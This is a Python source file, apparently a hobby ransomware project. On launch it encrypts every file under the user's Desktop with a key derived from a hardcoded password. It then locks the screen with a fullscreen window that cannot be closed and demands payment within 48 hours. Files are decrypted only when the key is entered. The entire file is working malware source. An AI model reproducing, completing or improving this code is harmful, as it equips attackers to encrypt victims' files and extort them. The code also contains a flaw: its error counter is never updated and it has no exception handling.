import tkinter as tk
from PIL import Image, ImageTk
import os
from pathlib import Path
import hashlib
from cryptography.fernet import Fernet
import base64

# tkinter is for GUI 
# PIL is for images
# os/pathlib is for files
# hashlib is for hashing the password
# crypto fernet is for encryption/decryption
# base64 is for encoding the sha256 key.

password = "test"
folder_to_encrypt = Path.home() / "Desktop"

def generate_key(password):
    hash = hashlib.sha256(password.encode()).digest()
    return Fernet(base64.urlsafe_b64encode(hash[:32]))

# Converts the password string into bytes, generates sha256 hash and uses the 32 first bytes of the hash as the encryption key.

def encrypt_file(file_path, fernet):
        
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted = fernet.encrypt(data)
        with open(file_path, 'wb') as f:
            f.write(encrypted)
        print(f"Encrypted: {file_path}")
   

# Reads the files content then encrypts it.

def decrypt_file(file_path, fernet):
        
        with open(file_path, 'rb') as f:
            data = f.read()
        decrypted = fernet.decrypt(data)
        with open(file_path, 'wb') as f:
            f.write(decrypted)
        print(f"Decrypted: {file_path}")

# Reads the files then decrypt it. 

def process_folder(folder_path, password, mode='encrypt'):
    fernet = generate_key(password)

    processed_files = 0
    error_files = 0
    
    if not os.path.exists(folder_path):
        print(f"Folder {folder_path} does not exist!")
        return 0, 0
    
    for root_dir, dirs, files in os.walk(folder_path):
        for file in files:
            full_path = os.path.join(root_dir, file)
         
            if mode == 'encrypt':
                    encrypt_file(full_path, fernet)
            elif mode == 'decrypt':
                    decrypt_file(full_path, fernet)
            processed_files += 1
           
    
    print(f"Process complete. {processed_files} files processed, {error_files} errors.")
    return processed_files, error_files

# Here is a function that checks if the folder is correct and exists and if 
# it exists it encrypts everything if it is in the encrypt mode.
# if it is in decrypt mode it runs the decrypt mode.

root = tk.Tk()
root.title("Ransomware")
root.configure(bg="black")

root.overrideredirect(True)
root.protocol("WM_DELETE_WINDOW", lambda: None)
root.attributes("-topmost", True)


image_path = "Skull.png"
original_image = Image.open(image_path)
resized_image = original_image.resize((700, 400))
image = ImageTk.PhotoImage(resized_image)
image_label = tk.Label(root, image=image, bg="black")
image_label.place(relx=0.5, rely=0.4, anchor="center")

title_label = tk.Label(root, text="YOUR FILES HAVE BEEN ENCRYPTED!", font=("Segoe UI", 30, "bold"), fg="red", bg="black")
title_label.place(relx=0.5, rely=0.65, anchor="center")

warning_label = tk.Label(root, text="Pay within 48 hours or lose all your files!", font=("Segoe UI", 30, "bold"), fg="red", bg="black")
warning_label.place(relx=0.5, rely=0.7, anchor="center")

status_label = tk.Label(root, text="", font=("Segoe UI", 16), fg="white", bg="black")
status_label.place(relx=0.5, rely=0.97, anchor="center")

key_label = tk.Label(root, text="Enter decryption key:",font=("Segoe UI", 20), fg="red", bg="black")
key_label.place(relx=0.5, rely=0.8, anchor="center")

key_entry = tk.Entry(root, font=("Segoe UI", 20), show="")
key_entry.place(relx=0.5, rely=0.85, anchor="center")

def decrypt_button_click():
    user_key = key_entry.get()
    if user_key == password:
        status_label.config(text="Decryption in progress...", fg="yellow")
        root.update()
        processed, errors = process_folder(folder_to_encrypt, user_key, mode='decrypt')
        status_label.config(text=f"Decryption successful! {processed} files processed, {errors} errors", fg="green")
        
        exit_button = tk.Button(root, text="Exit Program", font=("Segoe UI", 12), fg="white", bg="gray", command=root.destroy)
        exit_button.place(relx=0.9, rely=0.97, anchor="center")
    else:
        status_label.config(text="Incorrect key! Try again.", fg="red")

# If the entered password is correct it decrypts everything.


submit_button = tk.Button(root, text="Submit Key", font=("Segoe UI", 20), fg="black", bg="red", command=decrypt_button_click)
submit_button.place(relx=0.5, rely=0.92, anchor="center")

screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
root.geometry(f"{screen_width}x{screen_height}+{0}+{0}")

def run_encryption():
    print(f"Starting encryption of files in {folder_to_encrypt}")
    processed, errors = process_folder(folder_to_encrypt, password, mode='encrypt')
    print(f"Encryption complete. {processed} files processed, {errors} errors.")

run_encryption()

# Runs automaticly when starting the program.

root.mainloop()